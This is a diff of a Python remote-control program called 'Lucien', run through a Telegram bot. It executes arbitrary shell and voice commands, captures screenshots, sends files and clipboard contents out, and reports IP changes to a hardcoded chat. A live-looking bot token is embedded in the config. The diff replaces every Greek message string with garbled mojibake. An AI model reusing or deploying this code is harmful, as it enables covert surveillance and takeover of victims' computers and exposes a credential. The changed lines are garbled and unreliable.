@@ -1,4 +1,4 @@
-import telebot
+﻿import telebot
 import subprocess
 import pyautogui
 import os
@@ -13,7 +13,7 @@ from pystray import Icon, MenuItem as item, Menu
 from PIL import Image, ImageDraw
 
 # -- CONFIG
-CHAT_ID = 1837395252
+CHAT_ID = "1837395252"
 TOKEN = '7573715897:AAGgNmOxIOrRywzihuF4jFYkBTU9ymvwgn0'
 PIN_CODE = "360"
 BASE_PATH = os.getcwd()
@@ -49,12 +49,12 @@ def format_date(ts):
 
 def scan_folder(path):
     if not os.path.exists(path):
-        return "❌ Ο φάκελος δεν υπάρχει."
+        return "âŒ ÎŸ Ï†Î¬ÎºÎµÎ»Î¿Ï‚ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹."
     try:
         entries = os.listdir(path)
         if not entries:
-            return "📂 Ο φάκελος είναι άδειος."
-        lines = [f"📁 {path}"]
+            return "ðŸ“‚ ÎŸ Ï†Î¬ÎºÎµÎ»Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ Î¬Î´ÎµÎ¹Î¿Ï‚."
+        lines = [f"ðŸ“ {path}"]
         for entry in entries:
             full = os.path.join(path, entry)
             if os.path.isfile(full):
@@ -63,16 +63,16 @@ def scan_folder(path):
                 lines.append(f"- {entry} | {format_size(size)} | {format_date(date)}")
         return "\n".join(lines)
     except Exception as e:
-        return f"⚠️ Σφάλμα κατά το scan: {str(e)}"
+        return f"âš ï¸ Î£Ï†Î¬Î»Î¼Î± ÎºÎ±Ï„Î¬ Ï„Î¿ scan: {str(e)}"
 
 def execute_command(command):
     try:
         result = subprocess.check_output(command, shell=True, text=True)
         return result
     except subprocess.CalledProcessError as e:
-        return f"❌ Σφάλμα:\n{e.output}"
+        return f"âŒ Î£Ï†Î¬Î»Î¼Î±:\n{e.output}"
     except Exception as e:
-        return f"⚠️ Εξαίρεση:\n{str(e)}"
+        return f"âš ï¸ Î•Î¾Î±Î¯ÏÎµÏƒÎ·:\n{str(e)}"
 def take_screenshot():
     try:
         path = os.path.join(BASE_PATH, "screen.png")
@@ -103,7 +103,7 @@ def check_inactivity():
             if os.path.exists(log_path) and not os.path.exists(sent_flag):
                 try:
                     with open(log_path, 'rb') as f:
-                        bot.send_document(CHAT_ID, f, caption="🕓 24h inactivity – αυτόματο log")
+                        bot.send_document(CHAT_ID, f, caption="ðŸ•“ 24h inactivity â€“ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î¿ log")
                     open(sent_flag, 'w').close()
                 except:
                     pass
@@ -114,8 +114,8 @@ def watch_network():
         try:
             ip = socket.gethostbyname(socket.gethostname())
             if previous_ip and ip != previous_ip:
-                bot.send_message(CHAT_ID, f"🌐 Νέα IP ανιχνεύθηκε: {ip}")
-                log_action(f"IP άλλαξε: {previous_ip} → {ip}")
+                bot.send_message(CHAT_ID, f"ðŸŒ ÎÎ­Î± IP Î±Î½Î¹Ï‡Î½ÎµÏÎ¸Î·ÎºÎµ: {ip}")
+                log_action(f"IP Î¬Î»Î»Î±Î¾Îµ: {previous_ip} â†’ {ip}")
             previous_ip = ip
         except:
             pass
@@ -130,10 +130,10 @@ def recognize_speech():
                 audio = recognizer.listen(source, timeout=5)
             command = recognizer.recognize_google(audio, language='el-GR')
             if command:
-                log_action(f"🎙️ Φωνή: {command}")
+                log_action(f"ðŸŽ™ï¸ Î¦Ï‰Î½Î®: {command}")
                 output = execute_command(command)
                 if output:
-                    bot.send_message(CHAT_ID, f"🗣️ {command}\n📤 {output[:4000]}")
+                    bot.send_message(CHAT_ID, f"ðŸ—£ï¸ {command}\nðŸ“¤ {output[:4000]}")
         except sr.UnknownValueError:
             continue
         except:
@@ -155,16 +155,16 @@ def send_log_now(icon, item):
         log_path = os.path.join(LOG_FOLDER, today)
         if os.path.exists(log_path):
             with open(log_path, 'rb') as f:
-                bot.send_document(CHAT_ID, f, caption="📝 Χειροκίνητη αποστολή log")
+                bot.send_document(CHAT_ID, f, caption="ðŸ“ Î§ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î· Î±Ï€Î¿ÏƒÏ„Î¿Î»Î® log")
     except:
         pass
 
 def tray():
     global icon_instance
     icon_instance = Icon("Lucien", create_icon(), "Lucien", menu=Menu(
-        item('📤 Send Log Now', send_log_now),
-        item('📁 Show Status', show_status),
-        item('🔒 Exit (PIN μόνο)', lambda icon, item: None)
+        item('ðŸ“¤ Send Log Now', send_log_now),
+        item('ðŸ“ Show Status', show_status),
+        item('ðŸ”’ Exit (PIN Î¼ÏŒÎ½Î¿)', lambda icon, item: None)
     ))
     icon_instance.run()
 @bot.message_handler(func=lambda message: True)
@@ -179,13 +179,13 @@ def handle_message(message):
     if command.startswith("/pin "):
         entered_pin = command[5:].strip()
         if entered_pin == PIN_CODE:
-            bot.send_message(message.chat.id, "🔐 PIN OK. Τερματισμός Lucien...")
+            bot.send_message(message.chat.id, "ðŸ” PIN OK. Î¤ÎµÏÎ¼Î±Ï„Î¹ÏƒÎ¼ÏŒÏ‚ Lucien...")
             log_action("Lucien exited via PIN.")
             if icon_instance:
                 icon_instance.stop()
             os._exit(0)
         else:
-            bot.send_message(message.chat.id, "❌ Λάθος PIN.")
+            bot.send_message(message.chat.id, "âŒ Î›Î¬Î¸Î¿Ï‚ PIN.")
         return
 
     if command == "/screenshot":
@@ -200,10 +200,10 @@ def handle_message(message):
     if command.startswith("/get "):
         filename = command[5:].strip()
         if send_file(filename, message.chat.id):
-            bot.send_message(message.chat.id, f"📎 Απεστάλη: {filename}")
+            bot.send_message(message.chat.id, f"ðŸ“Ž Î‘Ï€ÎµÏƒÏ„Î¬Î»Î·: {filename}")
             log_action(f"File sent: {filename}")
         else:
-            bot.send_message(message.chat.id, f"❌ Δεν βρέθηκε: {filename}")
+            bot.send_message(message.chat.id, f"âŒ Î”ÎµÎ½ Î²ÏÎ­Î¸Î·ÎºÎµ: {filename}")
         return
 
     if command.startswith("/scan "):
@@ -215,16 +215,16 @@ def handle_message(message):
     if command == "/clip":
         try:
             clip = pyperclip.paste()
-            bot.send_message(message.chat.id, f"📋 Clipboard:\n{clip}")
+            bot.send_message(message.chat.id, f"ðŸ“‹ Clipboard:\n{clip}")
             log_action("Clipboard sent.")
         except Exception as e:
-            bot.send_message(message.chat.id, f"⚠️ Clipboard error: {str(e)}")
+            bot.send_message(message.chat.id, f"âš ï¸ Clipboard error: {str(e)}")
         return
 
     if command == "/startup":
         try:
             result = execute_command("wmic startup get Caption, Command")
-            bot.send_message(message.chat.id, f"🚀 Εκκίνηση:\n{result}")
+            bot.send_message(message.chat.id, f"ðŸš€ Î•ÎºÎºÎ¯Î½Î·ÏƒÎ·:\n{result}")
         except:
             pass
         return
